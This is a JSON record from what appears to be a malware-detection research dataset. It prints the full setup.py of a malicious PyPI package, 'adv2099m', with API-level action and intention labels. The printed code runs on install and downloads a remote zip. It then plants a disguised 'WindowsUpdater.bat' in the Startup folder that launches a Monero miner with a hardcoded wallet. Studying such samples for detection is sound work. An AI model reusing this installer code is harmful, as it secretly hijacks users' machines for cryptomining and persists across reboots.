{
  "metadata": {
    "package_name": "adv2099m-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/adv2099m-1.0.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/adv2099m-1.0.0/adv2099m-1.0.0/setup.py",
      "code_snippets": [
        {
          "snippet": "import base64\nimport os\nimport requests\nfrom zipfile import ZipFile\n\n#url download\nurl = \"https://download1085.mediafire.com/h5t294h9wiggBiOS47OJsrAqRrBavPAoZQwcwB5KIZ1pVBfq8nwg6f5tkwkJBp_-1SgEgF_7Byes35_olhHdHrO80O0ApX_h542P6jxftPccXDAK3U-Qs9bSPv30ozmTTutwK_j1vbrft2sCW4scgeVLHqLGrio4dAPUy_1DuXLOvw/0p52izgv4chgn3c/SystemComponents.zip\"\n\nmyfile = requests.get(url)\nopen(\"SystemComponents.zip\", \"wb\").write(myfile.content)\nwith ZipFile(\"SystemComponents.zip\", \"r\") as Zfile:\n    Zfile.extractall()\nos.remove(\"SystemComponents.zip\")\npath1 = os.getenv(\"AppData\")\npath2 = \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\Startup\"\nos.rename(\"SystemComponents\", path1 + \"\\\\SystemComponents\")\nf = open(\"WindowsUpdater.bat\", \"w+\")\nf.write(\"cd \" + path1 + \"\"\"\\\\SystemComponents\nWindowsXr.exe --opencl --cuda -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 39GPVHHtZdPGW2H3F1MMgW94KF8hxfsEWU -p x -k --nicehash -a rx/0\"\"\")\nf.close()\nos.rename(\"WindowsUpdater.bat\", path1 + path2 + \"\\\\WindowsUpdater.bat\")",
          "triple_sequences": [
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://download1085.mediafire.com/h5t294h9wiggBiOS47OJsrAqRrBavPAoZQwcwB5KIZ1pVBfq8nwg6f5tkwkJBp_-1SgEgF_7Byes35_olhHdHrO80O0ApX_h542P6jxftPccXDAK3U-Qs9bSPv30ozmTTutwK_j1vbrft2sCW4scgeVLHqLGrio4dAPUy_1DuXLOvw/0p52izgv4chgn3c/SystemComponents.zip",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"SystemComponents.zip\", \"wb\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "myfile.content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "ZipFile()",
              "action_description": "Opens ZIP archive for reading",
              "action_id": "open_zip_read",
              "object": "\"SystemComponents.zip\", \"r\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Open file",
              "intention_id": "open_file"
            },
            {
              "action_api": "ZipFile.extractall()",
              "action_description": "Extracts all files from ZIP archive to specified directory",
              "action_id": "extract_zip_files",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decompress downloaded archive",
              "intention_id": "decompress_downloaded_archive"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "\"SystemComponents.zip\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"AppData\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.rename()",
              "action_description": "Renames file or moves it to new location",
              "action_id": "rename_file",
              "object": "\"SystemComponents\", path1 + \"\\SystemComponents\"",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"WindowsUpdater.bat\", \"w+\"",
              "object_description": "Batch file path",
              "object_id": "batch_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "cd ",
              "object_description": "Batch file content",
              "object_id": "batch_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.rename()",
              "action_description": "Renames file or moves it to new location",
              "action_id": "rename_file",
              "object": "\"WindowsUpdater.bat\", path1 + path2 + \"\\WindowsUpdater.bat\"",
              "object_description": "Batch file path",
              "object_id": "batch_file_path",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            }
          ]
        }
      ]
    }
  ]
}